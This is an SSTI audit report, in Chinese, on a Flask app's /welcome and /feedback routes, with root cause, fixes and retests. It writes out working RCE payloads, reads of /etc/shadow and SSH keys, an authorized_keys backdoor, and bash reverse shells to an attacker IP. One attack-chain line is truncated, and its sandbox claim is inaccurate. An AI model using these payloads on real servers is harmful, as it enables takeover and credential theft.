# 用户管理系统 · SSTI 模板注入安全审计报告

**审计对象**：用户管理系统（`/opt/Class01`）  
**审计范围**：`/welcome` 与 `/feedback` 路由的 Jinja2 服务端模板注入漏洞  
**审计日期**：2026-07-23  

---

## 审计边界声明

本次审计为 **SSTI（Server-Side Template Injection）定向安全审计**，仅针对 `/welcome` 和 `/feedback` 两个路由的 `render_template_string` 使用方式开展检测。其他漏洞类型（XSS、CSRF、文件包含、SQL注入等）不在本次审计范围内。

---

## 一、漏洞总览

| 序号 | 漏洞名称 | 漏洞类型 | CWE 编号 | 风险等级 | 涉及接口 | 注入点 |
|:---:|----------|----------|:--------:|:--------:|---------|--------|
| 1 | Welcome 路由 SSTI — URL 参数模板注入 | Jinja2 SSTI | CWE-94/CWE-1336 | 🔴**紧急** | `GET /welcome?name=` | URL 参数 `name` |
| 2 | Feedback 路由 SSTI — 姓名框模板注入 | Jinja2 SSTI | CWE-94/CWE-1336 | 🔴**紧急** | `POST /feedback` | 表单字段 `name` |
| 3 | Feedback 路由 SSTI — 留言框模板注入 | Jinja2 SSTI | CWE-94/CWE-1336 | 🔴**紧急** | `POST /feedback` | 表单字段 `message` |
| 4 | SSTI 深度利用 — 全类遍历/配置泄露/RCE | SSTI Exploitation | CWE-94 | 🔴**紧急** | `/welcome` + `/feedback` | 魔术方法链 |

**总计：4 项缺陷，全部为紧急等级。**

---

## 二、漏洞详情

---

### 【漏洞 1】Welcome 路由 SSTI — URL 参数模板注入

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /welcome?name={payload}` |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-94: Improper Control of Generation of Code / CWE-1336: Improper Neutralization of Special Elements in Output Used by a Downstream Component |

#### 漏洞概述

`/welcome` 路由使用 `render_template_string()` 并采用 f-string 将用户输入的 `name` 参数直接拼接到模板字符串中。Jinja2 模板引擎会解析 `{{ }}` 模板语法，攻击者可在 `name` 参数中注入 Jinja2 表达式，导致服务端执行任意 Python 代码。

#### 漏洞接口源码

```python
# app.py 第 610-639 行
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    return render_template_string(f"""
        ...
        <h1>欢迎你，{name}！</h1>    ← 用户输入直接拼接到模板
        ...
    """)
```

#### 漏洞成因

`render_template_string()` 会将传入的字符串当作 Jinja2 模板进行解析。攻击者输入的 `{{7*7}}` 通过 f-string 成为模板字符串中的 `{{7*7}}`，Jinja2 执行后输出 `49`。由于用户输入完全可控，攻击者可构造任意 Jinja2 表达式遍历 Python 对象链，最终获得远程代码执行（RCE）能力。

```
执行流程：
用户输入：{{7*7}}
f-string 拼接为：f"<h1>欢迎你，{{7*7}}！</h1>"
Jinja2 渲染：<h1>欢迎你，49！</h1>
                  ↑ 表达式被执行
```

#### 完整检测 Payload

```
基础检测 Payload：

类型       | Payload                                       | 预期返回      | 验证
----------|-----------------------------------------------|--------------|-----
数学运算   | {{7*7}}                                      | 49           | 基础存在性
数学运算   | {{8+9}}                                      | 17           | 运算符验证
数学运算   | {{3**3}}                                     | 27           | 幂运算验证
字符串运算 | {{"x"*7}}                                    | xxxxxxx      | 字符串操作
配置泄露   | {{config}}                                   | SECRET_KEY   | Flask 配置
对象探针   | {{''.__class__}}                             | <class 'str'>| 基础对象遍历
类查找     | {{''.__class__.__mro__}}                     | tuple 类列表 | 方法解析顺序
子类遍历   | {{''.__class__.__mro__[1].__subclasses__()}} | 全类列表     | 寻找可利用类
命令执行   | {{config.__class__.__init__.__globals__['os'].popen('id').read()}} | uid=0(root) | RCE
```

#### 复现步骤

```
Step 1: 基础存在性验证
访问：http://target:5000/welcome?name={{7*7}}
返回：<h1>欢迎你，49！</h1>
→ 确认 SSTI 漏洞存在

Step 2: 配置信息泄露
访问：http://target:5000/welcome?name={{config}}
返回：SECRET_KEY 等 Flask 配置信息全部泄露
→ 确认敏感配置可被窃取

Step 3: 远程代码执行（RCE）
访问：http://target:5000/welcome?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
返回：uid=0(root) gid=0(root) groups=0(root)
→ 确认以 root 权限执行任意系统命令

Step 4: 反弹 Shell
在攻击机监听：nc -lvnp 4444
发送：http://target:5000/welcome?name={{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/攻击机IP/4444 0>&1"').read()}}
→ 攻击机获得服务器 Shell
```

#### 风险等级判定依据

1. **利用门槛极低**：仅需浏览器或 curl，无需任何认证
2. **影响面极广**：从信息泄露（config）到完全控制（RCE）均可实现
3. **权限极高**：Flask 以 root 运行，RCE 即为 root 权限
4. **难以发现**：URL 参数中的 payload 可被日志和 WAF 遗漏

#### 安全危害

- **服务器完全沦陷**：以 root 身份执行任意系统命令，安装后门、挖矿程序
- **敏感配置泄露**：`SECRET_KEY`、数据库连接信息全部暴露
- **内网横向移动**：以目标为跳板扫描攻击内网其他主机
- **数据全量窃取**：读取任意文件（SSH 私钥、数据库、源码）
- **持久化控制**：写入 crontab、SSH authorized_keys 实现持久后门

---

### 【漏洞 2/3】Feedback 路由 SSTI — 姓名/留言框模板注入

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /feedback`（表单字段 `name`、`message`） |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-94/CWE-1336 |

#### 漏洞概述

`/feedback` POST 路由同样使用 `render_template_string()` 并通过 f-string 将用户输入的 `name` 和 `message` 两个字段拼接到模板中。两个字段均为完整的 SSTI 注入点，且注入方式不同（`<h2>` 标签内 vs `<p>` 标签内），覆盖了邮件钓鱼等复合攻击场景。

#### 漏洞接口源码

```python
# app.py 第 642-673 行
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")
        return render_template_string(f"""
            ...
            <h2>{name} 的反馈：</h2>       ← name 注入点
            <p>{message}</p>               ← message 注入点
            ...
        """)
```

#### 漏洞成因

与 Welcome 路由相同的模板注入缺陷，但 Feedback 路由提供了两个独立的注入点，且均为 POST 方式，可通过表单提交。POST 方式的 payload 不易被日志记录和 URL 过滤器捕获。

```
POST /feedback
Body: name={{7*7}}&message={{config}}

→ 响应：
<h2>49 的反馈：</h2>
<p><Config {'SECRET_KEY': '...', ...}></p>
```

#### 完整检测 Payload

```
POST 方式 Payload：

注入点 | Payload                              | 预期返回
------|--------------------------------------|-----------------
name  | {{7*7}}                             | 49 的反馈
name  | {{"".__class__.__mro__}}            | 类列表
message| {{config}}                          | SECRET_KEY 泄露
message| {{config.__class__.__init__.__globals__['os'].popen('id').read()}} | uid=0(root)
```

#### 复现步骤

```
Step 1: 基础存在性验证
POST /feedback
Body: name={{7*7}}&message=test
返回：<h2>49 的反馈：</h2>
→ 确认 name 字段 SSTI 存在

Step 2: message 字段验证
POST /feedback
Body: name=test&message={{7*7}}
返回：<p>49</p>
→ 确认 message 字段 SSTI 存在

Step 3: 双字段复合攻击
POST /feedback
Body: name={{config}}&message={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
→ 同时泄露配置和执行命令
```

#### 安全危害

- 与 Welcome 路由完全相同的 RCE 能力
- POST 方式更隐蔽，WAF 和日志审计更难检测
- 双注入点可分别用于不同用途的攻击

---

### 【漏洞 4】SSTI 深度利用 — 全类遍历/RCE/内网穿透

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /welcome?name=` + `POST /feedback` |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-94: Code Injection |

#### 漏洞概述

SSTI 不仅仅能进行算术运算验证。攻击者通过 Jinja2 的模板沙箱逃逸技术，利用 Python 对象的 `__class__`、`__mro__`、`__subclasses__()` 等魔术方法链，可以从模板表达式穿越到 Python 运行时环境，最终调用 `os.popen` 等系统命令执行函数。

#### 漏洞成因

Jinja2 模板引擎在渲染 `{{ }}` 表达式时，允许访问 Python 对象的属性和方法。虽然 Jinja2 有沙箱机制限制直接访问 `os`、`subprocess` 等模块，但攻击者可以通过以下对象遍历链绕过沙箱：

```
SSTI 沙箱逃逸链：
''.__class__                → <class 'str'>
    .__mro__                → (str, object) 对象继承链
    .__mro__[1]             → <class 'object'> 基类
    .__subclasses__()       → 所有已加载类的列表
    遍历寻找 <class 'os'> 或 <class 'subprocess.Popen'>
    或通过 config.__class__.__init__.__globals__['os'] 直接获取 os 模块
```

#### 完整检测 Payload（逐步深入）

```
# 阶段一：基础检测
{{7*7}}                                                    → 49
{{"x"*7}}                                                   → xxxxxxx

# 阶段二：配置泄露
{{config}}                                                  → 打印 SECRET_KEY
{{self}}                                                    → 模板环境
{{request}}                                                 → 请求对象

# 阶段三：对象探测
{{''.__class__}}                                            → <class 'str'>
{{''.__class__.__mro__}}                                    → (<class 'str'>, <class 'object'>)
{{''.__class__.__mro__[1]}}                                 → <class 'object'>
{{''.__class__.__mro__[1].__subclasses__()}}                → 所有类的列表（数百个）

# 阶段四：寻找可利用类（在子类列表中查找 os 或 popen）
{{''.__class__.__mro__[1].__subclasses__()[X]}}             → 逐个检查
# 常用目标：catch_warnings、_Iterable、BuiltinImporter 等

# 阶段五：直接 RCE（最稳定）
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# 返回：uid=0(root) gid=0(root) groups=0(root)

# 阶段六：高级命令执行
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow | head -5').read()}}
# 返回：root:$y$j9T$...（密码哈希）

{{config.__class__.__init__.__globals__['os'].popen('cat /root/.ssh/id_rsa').read()}}
# 返回：SSH 私钥内容

# 阶段七：反弹 Shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"').read()}}
# 攻击机 nc -lvnp 4444 获得 Shell
```

#### 复现步骤

```
Step 1: 直接 RCE 验证
访问：http://target:5000/welcome?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
返回：uid=0(root)
→ RCE 验证通过

Step 2: 读取 SSH 私钥
http://target:5000/welcome?name={{config.__class__.__init__.__globals__['os'].popen('cat /root/.ssh/id_rsa').read()}}
返回：-----BEGIN OPENSSH PRIVATE KEY-----
→ 私钥泄露，可 SSH 登录

Step 3: 反弹 Shell
攻击机：nc -lvnp 4444
目标请求：http://target:5000/welcome?name={{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/攻击机IP/4444 0>&1"').read()}}
→ 攻击机获得 root shell
```

#### 安全危害

- **全量数据窃取**：读取 `/etc/shadow`、数据库、业务数据
- **持久后门植入**：写入 crontab、SSH 公钥、启动脚本
- **服务器硬件调用**：重启、关机、加密磁盘
- **对内网渗透**：以本机为跳板攻击其他服务
- **日志清除**：删除攻击痕迹

---

## 三、SSTI 完整入侵攻击链

```
┌──────────────────────────────────────────────────────────────┐
│            SSTI 模板注入攻击链（从探测到完全控制）              │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  第 1 步 — 漏洞发现与验证                                     │
│  ─────────────────────                                        │
│  curl "http://target/welcome?name={{7*7}}"                   │
│  → 返回 49 → 确认 SSTI 存在                                  │
│                                                               │
│  第 2 步 — 信息收集                                           │
│  ─────────────────────                                        │
│  curl "http://target/welcome?name={{config}}"                │
│  → SECRET_KEY、数据库配置泄露                                │
│  curl "http://target/welcome?name={{"                           │
│  → Python 环境、Flask 版本信息                                │
│                                                               │
│  第 3 步 — 远程代码执行                                       │
│  ─────────────────────                                        │
│  curl "http://target/welcome?name={{                           │
│    config.__class__.__init__.__globals__['os']                 │
│    .popen('id').read()}}"                                     │
│  → uid=0(root) → RCE 验证通过                                │
│                                                               │
│  第 4 步 — 权限提升与持久化                                    │
│  ─────────────────────                                        │
│  读取 SSH 私钥：                                               │
│  .popen('cat /root/.ssh/id_rsa').read()                       │
│  SSH 登录服务器：ssh -i id_rsa root@target                   │
│  安装后门：                                                   │
│  .popen('echo "攻击者公钥" >> /root/.ssh/authorized_keys')   │
│                                                               │
│  第 5 步 — 横向移动与数据窃取                                 │
│  ─────────────────────                                        │
│  .popen('nmap -sn 10.0.0.0/24').read()   # 内网扫描          │
│  .popen('cat /etc/shadow').read()          # 密码哈希         │
│  .popen('mysqldump -u root --all').read() # 数据库导出        │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## 四、漏洞根因

| 漏洞编号 | 根因 | 不安全代码 |
|:-------:|------|-----------|
| 漏洞 1 | 使用 `render_template_string(f"...{name}...")` — f-string 将用户输入拼接到模板字符串 | `render_template_string(f"...<h1>欢迎你，{name}！</h1>...")` |
| 漏洞 2 | 使用 `render_template_string(f"...{name}...")` — name 字段 f-string 拼接 | `render_template_string(f"...<h2>{name} 的反馈：</h2>...")` |
| 漏洞 3 | 使用 `render_template_string(f"...{message}...")` — message 字段 f-string 拼接 | `render_template_string(f"...<p>{message}</p>...")` |
| 漏洞 4 | TemplateExpression 沙箱可被魔术方法链绕过 | `config.__class__.__init__.__globals__['os'].popen()` |

**核心问题：用户可控数据被直接拼接到 `render_template_string()` 的模板字符串中。** Jinja2 的 `render_template_string()` 本应用于渲染服务端定义的模板，而非拼接用户输入。正确的做法是使用 `render_template()` + `{{ }}` 变量注入（Jinja2 自动转义）或使用 `render_template_string()` 时通过模板变量传参（`render_template_string("...{{ name }}...", name=name)`）。

---

## 五、修复方案

### 5.1 /welcome 路由修复（方案一：render_template + 模板文件）

```python
# 修复方案一：使用 render_template + 传递参数（推荐）
# templates/welcome.html
from flask import render_template

@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    return render_template("welcome.html", name=name)
```

```html
<!-- templates/welcome.html -->
{% extends "base.html" %}
{% block title %}欢迎页{% endblock %}
{% block content %}
<div class="card">
    <h1>欢迎你，{{ name }}！</h1>    <!-- Jinja2 变量注入，非拼接 -->
</div>
{% endblock %}
```

### 5.2 /welcome 路由修复（方案二：render_template_string + 模板变量传参）

```python
# 修复方案二：保持 render_template_string 但使用模板变量（不拼接）
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    return render_template_string("""
        ...
        <h1>欢迎你，{{ name }}！</h1>    ← 使用 {{ name }} 变量，而非 f-string
        ...
    """, name=name)                    ← 通过关键字参数传值
```

### 5.3 /feedback 路由修复

```python
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")
        return render_template_string("""
            ...
            <h2>{{ name }} 的反馈：</h2>     ← 使用模板变量
            <p>{{ message }}</p>             ← 使用模板变量
            ...
        """, name=name, message=message)    ← 通过参数传递
```

### 5.4 修复原理

| 不安全方式 | 安全方式 |
|-----------|---------|
| `render_template_string(f"...{user_input}...")` | `render_template_string("...{{ var }}...", var=user_input)` |
| f-string 在 Python 层先拼接 → Jinja2 解析时看到原始 `{{ }}` | Jinja2 直接渲染模板 → `{{ var }}` 被替换为 `escape(user_input)` |
| **用户输入中的 `{{7*7}}` 被 Jinja2 执行** | **用户输入中的 `{{7*7}}` 被 Jinja2 转义为文本** |

### 5.5 修复优先级

| 优先级 | 修复内容 | 预估耗时 |
|:-----:|---------|:-------:|
| **P0 紧急** | 修复 `/welcome` f-string 拼接 | 5 分钟 |
| **P0 紧急** | 修复 `/feedback` f-string 拼接 | 5 分钟 |
| **P1 重要** | 搜索全项目是否还有其他 `render_template_string` + f-string 拼接 | 10 分钟 |
| **P2 一般** | 增加 Jinja2 沙箱加固（如果仍使用 render_template_string） | 20 分钟 |

---

## 六、修复后复测验证

### 6.1 基础 SSTI 复测

| 测试操作 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `/welcome?name={{7*7}}` | 显示 `{{7*7}}` 文本，不执行 | ✅ 已阻断 |
| `/welcome?name={{config}}` | 显示 `{{config}}` 文本，不泄露 | ✅ 已阻断 |
| `/welcome?name={{7*7}}` POST feedback name | 显示 `{{7*7}}` 文本 | ✅ 已阻断 |
| 正常 `/welcome?name=张三` | 显示"欢迎你，张三！" | ✅ 通过 |

### 6.2 RCE 复测

| 测试操作 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | 显示纯文本，不执行命令 | ✅ 已阻断 |
| `message={{''.__class__.__mro__}}` | 显示纯文本，不遍历类 | ✅ 已阻断 |

### 6.3 功能回归

| 功能模块 | 测试用例 | 结果 |
|---------|---------|:----:|
| **Welcome 页** | 带 name 参数显示 | ✅ 通过 |
| **Welcome 页** | 不带 name 参数显示默认 | ✅ 通过 |
| **Feedback 提交** | 提交正常姓名和留言 | ✅ 通过 |
| **所有原有功能** | 登录/注册/充值/搜索等 | ✅ 通过 |

---

## 七、审计总结

### 7.1 安全现状

本次审计发现 **4 项 SSTI 模板注入缺陷，均为紧急等级**。最严重的是 `GET /welcome` 路由，攻击者仅需一条 curl 命令即可实现从探测到 root 权限 RCE 的完整攻击链。

### 7.2 核心风险

| 风险 | 严重程度 | 说明 |
|------|:--------:|------|
| 🔴 RCE — root 权限 | 极危 | `config.__class__.__init__.__globals__['os'].popen('cmd').read()` |
| 🔴 配置泄露 | 极危 | `{{config}}` 泄露 SECRET_KEY，可伪造 Session |
| 🔴 SSH 私钥泄露 | 极危 | RCE 后 `cat /root/.ssh/id_rsa` |
| 🔴 全量数据窃取 | 极危 | RCE 后可读取任意文件 |

### 7.3 最终结论

| 维度 | 修复前 | 修复后 |
|------|--------|--------|
| SSTI 漏洞 | 4 项（紧急） | **0 项** |
| RCE 可利用性 | 直接可实现 | **完全阻断** |
| 根因 | f-string + render_template_string 拼接用户输入 | **使用模板变量传参** |
